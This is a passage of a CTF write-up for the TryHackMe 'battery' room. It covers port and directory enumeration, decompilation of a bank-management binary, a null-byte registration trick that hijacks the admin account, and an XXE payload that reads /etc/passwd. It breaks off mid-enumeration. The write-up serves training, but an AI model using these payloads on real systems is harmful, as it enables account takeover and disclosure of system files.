# battery — Writeup

## Overview
### battery — Writeup
### battery — Writeup
----
CTF designed by CTF lover for CTF lovers
----
![](https://tryhackme-images.s3.amazonaws.com/room-icons/e360a8a69b9074a812f3ee487c0189a0.png)
Start Machine
Electricity bill portal has been hacked many times in the past , so we have fired one of the employee from the security team , As a new recruit you need to work like a hacker to find the loop holes in the portal and gain root access to the server .
Hope you will enjoy the journey !
**Do not publish writeup / walkthrough before 19/01/2021**
Answer the questions below

## Enumeration
```text
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.180.32 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.180.32:22
Open 10.10.180.32:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.180.32 [2 ports]
Discovered open port 80/tcp on 10.10.180.32
Discovered open port 22/tcp on 10.10.180.32
Completed Connect Scan (2 total ports)
Initiating Service scan
Scanning 2 services on 10.10.180.32
Completed Service scan (2 services on 1 host)
NSE: Script scanning 10.10.180.32.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.180.32
Host is up, received user-set (0.20s latency).

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 146b674c1e89ebcd47a2406f5f5c8cc2 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAPe2PVDHBBlUCEtHNVxjToY/muZpZ4hrISDM7fuGOkh/Lp9gAwpEh24Y/u197WBDTihDJsDZJqrJEJSWbpiZgReyh1LtJTt3ag8GrUUDJCNx6lLUIWR5iukdpF7A2EvV4gFn7PqbmJmeeQRtB+vZJSp6VcjEG0wYOcRw2Z6N6ho3AAAAFQCg45+RiUGvOP0QLD6PPtrMfuzdQQAAAIEAxCPXZB4BiX72mJkKcVJPkqBkL3t+KkkbDCtICWi3d88rOqPAD3yRTKEsASHqSYfs6PrKBd50tVYgeL+ss9bP8liojOI7nP0WQzY2Zz+lfPa+d0uzGPcUk0Wg3EyLLrZXipUg0zhPjcXtxW9+/H1YlnIFoz8i/WWJCVaUTIR3JOoAAACBAMJ7OenvwoThUw9ynqpSoTPKYzYlM6OozdgU9d7R4XXgFXXLXrlL0Fb+w7TT4PwCQO1xJcWp5xJHi9QmXnkTvi386RQJRJyI9l5kM3E2TRWCpMMQVHya5L6PfWKf08RYGp0r3QkQKsG1WlvMxzLCRsnaVBqCLasgcabxY7w6e2EM
|   2048 6642f791e47bc67e4717c627a7bc6e73 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkDLTds2sLmn9AZ0KAl70Fu5gfx5T6MDJehrsCzWR3nIVczHLHFVP+jXDzCcB075jjXbb+6IYFOdJiqgnv6SFxk85kttdvGs/dnmJ9/btJMgqJI0agbWvMYlXrOSN26Db3ziUGrddEjTT74Z1kokg8d7uzutsfZjxxCn0q75NDfDpNNMLlstOEfMX/HtOUaLQ47IeuSpaQoUkNkHF2SGoTTpbC+avzcCNHRIZEwQ6HdA3vz1OY6TnpAk8Gu6st9XoDGblGt7xv1vyt0qUdIYaKib8ZJQyj1vb+SJx6dCljix4yDX+hbtyKn08/tRfNeRhVSIIymOTxSGzBru2mUiO5
|   256 a86a92ca12af8542e49c2b0eb5fba88b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCYHRWUDqeSQgon8sLFyvLMQygCx01yXZR6kxiT/DnZU+3x6QmTUir0HaiwM/n3aAV7eGigds0GPBEVpmnw6iu4=
|   256 62e4a3f6c619ad300a30a1eb4ad312d3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILW7vyhbG1WLLhSEDM0dPxFisUrf7jXiYWNSTqw6Exri
80/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.59 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ dirsearch -u http://10.10.180.32/ -i200,301,302,401 -w /usr/share/wordlists/dirb/common.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4613

Output File: /home/witty/.dirsearch/reports/10.10.180.32/-_23-07-04_21-03-28.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-07-04_21-03-28.log

Target: http://10.10.180.32/

[21:03:29] Starting: 
[21:03:36] 200 -  663B  - /admin.php
[21:03:49] 200 -  406B  - /index.html
[21:04:04] 200 -   17KB - /report
[21:04:05] 301 -  313B  - /scripts  ->  http://10.10.180.32/scripts/

Task Completed
                                                                                   
┌──(witty㉿kali)-[~/Downloads]
└─$ cat report 
ELF>�@�:@8
          @@@@h���hhmm   00�-�=�=hp�-�=�=����DDP�tdt"t"t"TTQ�tdR�td�-�=�=/lib64/ld-linux-x86-64.so.2GNUD���h�{��t�?��N��GNU
�
�e�mk 92� � #"__isoc99_scanfputsprintfsystem__cxa_finalizestrcmp__libc_start_mainlibc.so.6GLIBC_2.7GLIBC_2.2.5_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMUu�ieTab_�p�0HH@�?�?�?�?	�?
@ @(@0@8H�H��/H��t��H���5�/�%�/@�%�/h������%�/h������%�/h������%�/h�����%�/h�����%rSH�=��&/�DH�=�/H��/H9�tH��.H��t	�����H�=Y/H�5R/H)�H��H��?H��H�H��tH��.H����fD���=/u/UH�=�.H��t
           H�=�.�-����h�����.]�����{���UH��H��H�}�H�u�H�E�H�5xH���������uH�=u������H�=}�p��������UH��H�=��S���H�=��G���H�=��;���H�=��/���H�=��#���H�=�����H�=��
                                                                            ����]�UH��H�=������H�=������H�=������H�=������H�=������H�=�����H�=�����H�=�����H�=�����H�=����H�=��{���H�=��o���������]�UH��H��ǅ|���H�=��A���H�=��5���H�=���D���H�E�H��H�=���L���H�=�����H�=������H�E�H��H�=������H�E�H�5�H����������eH�E�H�5�H����������J��4�����X���H�=��H��|���H��H�=V�������|�����u��I�������|�����usH�=#��P���H�E�H��H�=�
��#���H�U�H�E�H��H�������f��|�����t
����H�=^                           ��|�����u)H�=�
����H�=5�������.����'H�=�
��f������f.�DAWL�=�(AVI��AUI��ATA��UH�-�(SL)�H������H��t�L��L��D��A��H��H9�u�H�[]A\A]A^A_��H�H��admin@bank.aPassword Updated Successfully!
Sorry you can't update the password
Welcome Guest
===================Available Options==============
1. Check users2. Add user3. Delete user4. change password5. Exitclear
===============List of active users================support@bank.acontact@bank.acyber@bank.aadmins@bank.asam@bank.aadmin0@bank.asuper_user@bank.acontrol_admin@bank.ait_admin@bank.a

Welcome To ABC DEF Bank Managemet System!

UserName : %s
Password : guestYour Choice : %demail : not available for guest account
Wrong option
Wrong username or passwordP	�����
                                     �������l����Y��������Z���<����\�����zRx
                                                                           ����+zRx
                                                                                 ���`FJ
S   �?�;*3$"D@��\���XA�C
VU���[A�C
������A�C
����#A�C
D�(���]B�I�E �E(�D0�H8�G@j8A0A(B BB$@���p0K
d������80
�
 @x��	������o���o���o����o�=6FVfvH@GCC: (Debian 9.3.0-15) 9.3.0��08�  0
�

��d t"�"�=�=�=�?@@@P@���
                        ��!07P@F�=mpy�=������,$����=��=��=�t"�@�
                                                                `uX � @@8JP@dQ�[Ym(�s��@@�� �H@� �]�X@��+P@�#-P@9 S"crtstuff.cderegister_tm_clones__do_global_dtors_auxcompleted.7452__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entryreport.c__FRAME_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_finiupdate_ITM_deregisterTMCloneTableputs@@GLIBC_2.2.5_edataoptionssystem@@GLIBC_2.2.5usersprintf@@GLIBC_2.2.5__libc_start_main@@GLIBC_2.2.5__data_startstrcmp@@GLIBC_2.2.5__gmon_start____dso_handle_IO_stdin_used__libc_csu_init__bss_startmain__isoc99_scanf@@GLIBC_2.7__TMC_END___ITM_registerTMCloneTable__cxa_finalize@@GLIBC_2.2.5.symtab.strtab.shstrtab.interp.note.gnu.build-id.note.ABI-tag.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.dynamic.got.plt.data.bss.comment�#��$6�� D��No
                                     V88�^���o��k���oz00�B����  `�����dd	�  �t"t"T��"�"������=�-��?��@�@@@P@P�0P0p0�-       7o�9                               

┌──(witty㉿kali)-[~/Downloads]
└─$ file report 
report: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=44ffe4e81d688f7b7fe59bdf74b03f828a4ef3fe, for GNU/Linux 3.2.0, not stripped

undefined8 main(void)

{
  int iVar1;
  int local_8c;
  char local_88 [32];
  char local_68 [32];
  undefined local_48 [32];
  undefined local_28 [32];
  
  local_8c = 0;
  puts("\n\n\n");
  puts("Welcome To ABC DEF Bank Managemet System!\n\n");
  printf("UserName : ");
  __isoc99_scanf(&DAT_001021f0,local_68);
  puts("\n");
  printf("Password : ");
  __isoc99_scanf(&DAT_001021f0,local_88);
  iVar1 = strcmp(local_68,"guest");
  if ((iVar1 == 0) && (iVar1 = strcmp(local_88,"guest"), iVar1 == 0)) {
    options();
    while (local_8c != 5) {
      printf("Your Choice : ");
      __isoc99_scanf(&DAT_00102216,&local_8c);
      if (local_8c == 1) {
        users();
      }
      else if (local_8c == 4) {
        printf("email : ");
        __isoc99_scanf(&DAT_001021f0,local_28);
        puts("\n");
        printf("Password : ");
        __isoc99_scanf(&DAT_001021f0,local_48);
        update(local_28,local_48);
      }
      else if ((local_8c == 3) || (local_8c == 2)) {
        puts("not available for guest account\n");
        system("clear");
        options();
      }
      else {
        puts("Wrong option\n");
        system("clear");
        options();
      }
    }
  }
  else {
    printf("Wrong username or password");
  }
  return 0;
}

void update(char *param_1)

{
  int iVar1;
  
  iVar1 = strcmp(param_1,"admin@bank.a");
  if (iVar1 == 0) {
    puts("Password Updated Successfully!\n");
    options();
  }
  else {
    puts("Sorry you can\'t update the password\n");
    options();
  }
  return;
}

admin@bank.a%00

void users(void)

{
  system("clear");
  puts("\n===============List of active users================");
  puts("support@bank.a");
  puts("contact@bank.a");
  puts("cyber@bank.a");
  puts("admins@bank.a");
  puts("sam@bank.a");
  puts("admin0@bank.a");
  puts("super_user@bank.a");
  puts("admin@bank.a");
  puts("control_admin@bank.a");
  puts("it_admin@bank.a\n\n");
  options();
  return;
}

http://10.10.180.32/register.php

uname=admin%40bank.a%00&bank=ABC&password=admi+&btn=Register+me%21

admin@bank.a:admi

   var xml = '' +
        '<?xml version="1.0" encoding="UTF-8"?>' +
        '<root>' +
        '<name>' + $('#name').val() + '</name>' +
        '<search>' + $('#search').val() + '</search>' +
        '</root>';

https://github.com/jesusgavancho/PayloadsAllTheThings/tree/master/XXE%20Injection

<!--?xml version="1.0" ?-->

<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>

<root>

<name>

test

</name>

<search>

&example;

</search>

</root>

Sorry, account number 
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmxpYnV1aWQ6eDoxMDA6MTAxOjovdmFyL2xpYi9saWJ1dWlkOgpzeXNsb2c6eDoxMDE6MTA0OjovaG9tZS9zeXNsb2c6L2Jpbi9mYWxzZQptZXNzYWdlYnVzOng6MTAyOjEwNjo6L3Zhci9ydW4vZGJ1czovYmluL2ZhbHNlCmxhbmRzY2FwZTp4OjEwMzoxMDk6Oi92YXIvbGliL2xhbmRzY2FwZTovYmluL2ZhbHNlCnNzaGQ6eDoxMDQ6NjU1MzQ6Oi92YXIvcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4KY3liZXI6eDoxMDAwOjEwMDA6Y3liZXIsLCw6L2hvbWUvY3liZXI6L2Jpbi9iYXNoCm15c3FsOng6MTA3OjExMzpNeVNRTCBTZXJ2ZXIsLCw6L25vbmV4aXN0ZW50Oi9iaW4vZmFsc2UKeWFzaDp4OjEwMDI6MTAwMjosLCw6L2hvbWUveWFzaDovYmluL2Jhc2gK
 is not active!

eXNsb2c6eDoxMDE6MTA0OjovaG9tZS9zeXNsb2c6L2Jpbi9mYWxzZQptZXNzYWdlYnVzOng6MTAyOjEwNjo6L3Zhci9ydW4vZGJ1czovYmluL2ZhbHNlCmxhbmRzY2FwZTp4OjEwMzoxMDk6Oi92YXIvbGliL2xhbmRzY2FwZTovYmluL2ZhbHNlCnNzaGQ6eDoxMDQ6NjU1MzQ6Oi92YXIvcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4KY3liZXI6eDoxMDAwOjEwMDA6Y3liZXIsLCw6L2hvbWUvY3liZXI6L2Jpbi9iYXNoCm15c3FsOng6MTA3OjExMzpNeVNRTCBTZXJ2ZXIsLCw6L25vbmV4aXN0ZW50Oi9iaW4vZmFsc2UKeWFzaDp4OjEwMDI6MTAwMjosLCw6L2hvbWUveWFzaDovYmluL2Jhc2gK" | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
landscape:x:103:109::/var/lib/landscape:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
cyber:x:1000:1000:cyber,,,:/home/cyber:/bin/bash
mysql:x:107:113:MySQL Server,,,:/nonexistent:/bin/false
yash:x:1002:1002:,,,:/home/yash:/bin/bash

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://10.10.180.32/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.180.32/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              html,php,txt
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
